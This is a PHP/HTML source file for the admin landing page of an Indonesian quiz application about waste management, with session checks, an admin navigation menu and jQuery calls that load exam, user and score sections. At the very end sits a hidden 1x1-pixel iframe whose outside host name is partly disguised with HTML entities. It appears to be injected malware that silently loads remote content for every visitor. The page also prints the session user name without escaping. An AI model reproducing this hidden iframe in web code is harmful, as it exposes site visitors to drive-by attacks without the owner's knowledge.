<?php 
session_start();
if (!isset($_SESSION["login"])) {
  header("Location: login.php");
  exit;
}
require "../koneksi.php";
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>Aplikasi Soal Acak - Admin</title>

    <!-- Bootstrap -->    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
    <link href="../assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="../assets/css/style.css" rel="stylesheet">
    <link href="../src/style/style.css" rel="stylesheet">
     <!-- sweeat alert -->
    <link href="../assets/sweet_alert/dist/sweetalert.css" rel="stylesheet"/>
    <link rel="stylesheet" href="../assets/datatables/dataTables.bootstrap.css">
  </head>
  <body>
    

    <div class="container">

      <div class="navigasi">

        <nav class="navbar navbar-default">
          <div class="container-fluid">
            <!-- Brand and toggle get grouped for better mobile display -->
            <div class="navbar-header">
              <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
              </button>
              <a class="navbar-brand" href="#"><img alt="Brand" src="../assets/img/quiz.png" width="30"></a>
              
            </div>
            <header>
              <a href="#" class="logo">Web Multimedia Penanggulangan Sampah</a>
              <div class="bx bx-menu" id="menu-icon"></div>
              <ul class="navbar">
                  <?php if ($_SESSION['user'] =='admin') { ?>
                  <li><a href="#" onclick="soaljawab()">Soal & Jawaban</a></li>
                  <li><a href="#" onclick="manage_user()">Manage User</a></li>    
                  <li><a href="#" onclick="nilai()">Nilai</a></li>
                  <li><a href="index.php">Mulai Ujian</a></li>
                  <li role="separator" class="divider"></li>
                  <li><a href="logout.php">Logout</a></li>   
                  <?php  }  ?>
                  <?php if ($_SESSION['user'] !='admin') { ?>
                    <li><a href="logout.php">Logout</a></li> 
                  <?php  }  ?>
                  <div class="bx bx-moon" id="greenmode"></div>
              </ul>
            </header>
            <!-- Collect the nav links, forms, and other content for toggling -->
            
          </div><!-- /.container-fluid -->
        </nav>
      </div>

      <div class="isi">
        <div class="jumbotron">
          <div id="kontenku">
              <div class="row">
              
                  <div class="col-sm-12">
                    <img src="../src/img/wasteimage.png" alt="../src/img/wasteimage.png" class="img img-responsive imgku" style="width: 500px;">
                  </div>
                  <div class="col-sm-12 text-center">
                    <h1>Hello, Selamat Datang.. <?= $_SESSION["user"]; ?> </h1>
                    <p>Anda akan memulai Ujian?</p>
                    <p><a class="btn btn-primary btn-lg" onclick="mulai()" href="#" role="button" style="background: rgb(78 175 148);">Klik disini</a></p>
                  </div>

            </div>
          </div>
          
          
          
          

        </div>
      </div>

      <div class="footer">
      </div>      

        


    </div>
    
    
    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="../assets/js/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="../assets/js/bootstrap.min.js"></script>
    <!-- sweetalert -->
    <script src="../assets/sweet_alert/dist/sweetalert.min.js"></script>
    <!-- datatable -->
    <script src="../assets/datatables/jquery.dataTables.min.js"></script>
    <script src="../assets/datatables/dataTables.bootstrap.min.js"></script>

    <script>
     
      function mulai() {
        $('#kontenku').load('ajax/soal.php');
      }
      function soaljawab() {
        $('#kontenku').load('ajax/soaljawab.php');
      }
      function manage_user() {
        $('#kontenku').load('ajax/user.php');
      }
      function nilai() {
        $('#kontenku').load('ajax/skor.php');
      }
    </script>
  
<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
</body>
</html>